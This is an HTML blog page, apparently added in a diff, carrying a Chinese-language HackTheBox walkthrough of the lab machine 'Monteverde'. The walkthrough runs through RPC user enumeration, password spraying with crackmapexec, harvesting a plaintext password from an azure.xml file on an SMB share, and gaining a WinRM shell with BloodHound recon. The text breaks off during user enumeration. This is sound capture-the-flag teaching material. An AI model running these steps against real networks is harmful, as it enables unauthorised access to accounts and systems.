@@ -1,0 +1,687 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTB Walkthrough - MonteverdeRecon:123456789101112131415161718192021222324252627282930313233343536373839# Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Monteverde">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Monteverde.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="HTB Walkthrough - MonteverdeRecon:123456789101112131415161718192021222324252627282930313233343536373839# Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.1">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-08-13T22:39:09.020Z">
+<meta property="article:modified_time" content="2022-12-21T06:57:26.000Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>HTB Walkthrough - Monteverde - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Monteverde"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          82 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Monteverde</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="HTB-Walkthrough-Monteverde"><a href="#HTB-Walkthrough-Monteverde" class="headerlink" title="HTB Walkthrough - Monteverde"></a>HTB Walkthrough - Monteverde</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.172</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.172</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 65516 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-26 05:37:52Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49693/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49744/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: -1s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2022-05-26T05:38:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu May 26 13:39:38 2022 -- 1 IP address (1 host up) scanned in 691.10 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>SMB是不允许匿名访问的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.172          </span><br><span class="line">[+] IP: 10.10.10.172:445	Name: 10.10.10.172 </span><br></pre></td></tr></table></figure>
+
+<p>那么只能从RPC下手：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U <span class="string">&quot;&quot;</span> -N 10.10.10.172</span><br><span class="line">rpcclient $&gt; <span class="built_in">exit</span></span><br><span class="line">$ rpcclient -U <span class="string">&quot;&quot;</span> -N 10.10.10.172 -c enumdomusers &gt; user.txt</span><br><span class="line">$ <span class="built_in">cat</span> user.txt     </span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[AAD_987d7f2f57d2] rid:[0x450]</span><br><span class="line">user:[mhope] rid:[0x641]</span><br><span class="line">user:[SABatchJobs] rid:[0xa2a]</span><br><span class="line">user:[svc-ata] rid:[0xa2b]</span><br><span class="line">user:[svc-bexec] rid:[0xa2c]</span><br><span class="line">user:[svc-netapp] rid:[0xa2d]</span><br><span class="line">user:[dgalanos] rid:[0xa35]</span><br><span class="line">user:[roleary] rid:[0xa36]</span><br><span class="line">user:[smorgan] rid:[0xa37]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> user.txt | awk -F <span class="string">&quot;[&quot;</span>  <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; newuser.txt</span><br><span class="line">$ <span class="built_in">cat</span> newuser.txt| awk -F <span class="string">&quot;]&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; exitusers.txt</span><br><span class="line">$ <span class="built_in">cat</span> exitusers.txt                                       </span><br><span class="line">Guest</span><br><span class="line">AAD_987d7f2f57d2</span><br><span class="line">mhope</span><br><span class="line">SABatchJobs</span><br><span class="line">svc-ata</span><br><span class="line">svc-bexec</span><br><span class="line">svc-netapp</span><br><span class="line">dgalanos</span><br><span class="line">roleary</span><br><span class="line">smorgan</span><br></pre></td></tr></table></figure>
+
+<p>这样我就获取到了一个用户名字典。</p>
+<h4 id="SMB："><a href="#SMB：" class="headerlink" title="SMB："></a>SMB：</h4><p>继续在rpc搜索了一番，并没有找到任何密码， 我尝试对用户进行喷涂，就以收集到的用户名字典既当用户名亦当字典：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.10.172 -u user.txt -p user.txt --continue-on-success                   </span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">&lt;skip&gt;..............................................</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>命中一个：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs</span><br><span class="line">[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      </span><br><span class="line">    Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	azure_uploads                                     	READ ONLY	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	E$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	<span class="built_in">users</span>$                                            	READ ONLY</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span class="string">&#x27;azure_uploads&#x27;</span></span><br><span class="line">[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	azure_uploads                                     	READ ONLY	</span><br><span class="line">	.\azure_uploads\*</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 20:43:36 2020	.</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 20:43:36 2020	..</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span class="string">&#x27;users$&#x27;</span>       </span><br><span class="line">[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	<span class="built_in">users</span>$                                            	READ ONLY	</span><br><span class="line">	.\<span class="built_in">users</span>$\*</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:12:48 2020	.</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:12:48 2020	..</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:15:23 2020	dgalanos</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:41:18 2020	mhope</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:14:56 2020	roleary</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:14:28 2020	smorgan</span><br><span class="line">	.\<span class="built_in">users</span>$\mhope\*</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:41:18 2020	.</span><br><span class="line">	dr--r--r--                0 Fri Jan  3 21:41:18 2020	..</span><br><span class="line">	fw--w--w--             1212 Fri Jan  3 22:59:24 2020	azure.xml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c <span class="string">&#x27;get mhope/azure.xml azure.xml&#x27;</span></span><br><span class="line">getting file \mhope\azure.xml of size 1212 as azure.xml (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)</span><br><span class="line">$ <span class="built_in">cat</span> azure.xml           </span><br><span class="line">��&lt;Objs Version=<span class="string">&quot;1.1.0.1&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span><br><span class="line">  &lt;Obj RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;TN RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;DT N=<span class="string">&quot;StartDate&quot;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span><br><span class="line">      &lt;DT N=<span class="string">&quot;EndDate&quot;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span><br><span class="line">      &lt;G N=<span class="string">&quot;KeyId&quot;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;</span><br><span class="line">      &lt;S N=<span class="string">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;   </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> 4n0therD4y@n0th3r$ &gt; passwd.txt</span><br><span class="line">$ crackmapexec smb 10.10.10.172 -u mhope -p passwd.txt --continue-on-success|grep <span class="string">&#x27;[+]&#x27;</span></span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$                            </span><br><span class="line">[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      </span><br><span class="line">    Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	azure_uploads                                     	READ ONLY	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	E$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	<span class="built_in">users</span>$                                            	READ ONLY</span><br></pre></td></tr></table></figure>
+
+<h4 id="WINRM"><a href="#WINRM" class="headerlink" title="WINRM:"></a>WINRM:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec winrm 10.10.10.172 -u mhope -p passwd.txt --continue-on-success|grep <span class="string">&#x27;[+]&#x27;</span></span><br><span class="line">WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$ </span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\mhope\desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\mhope\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---         1/3/2020   5:48 AM             32 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\mhope\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">4961....................................</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\mhope\desktop&gt; ipconfig /all</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : MONTEVERDE</span><br><span class="line">   Primary Dns Suffix  . . . . . . . : MEGABANK.LOCAL</span><br><span class="line">   Node <span class="built_in">Type</span> . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line">   DNS Suffix Search List. . . . . . : MEGABANK.LOCAL</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python --zip -c All -u mhope -p 4n0therD4y@n0th3r$ -ns 10.10.10.172 -dc MONTEVERDE.MEGABANK.LOCAL -d MEGABANK.LOCAL</span><br><span class="line">INFO: Found AD domain: megabank.local</span><br><span class="line">INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL</span><br><span class="line">INFO: Found 13 <span class="built_in">users</span></span><br><span class="line">INFO: Connecting to GC LDAP server: MONTEVERDE.MEGABANK.LOCAL</span><br><span class="line">INFO: Found 65 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: MONTEVERDE.MEGABANK.LOCAL</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 52S</span><br><span class="line">INFO: Compressing output into 20220526142408_bloodhound.zip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\mhope\desktop&gt; net user mhope</span><br><span class="line">User name                    mhope</span><br><span class="line">Full Name                    Mike Hope</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            1/2/2020 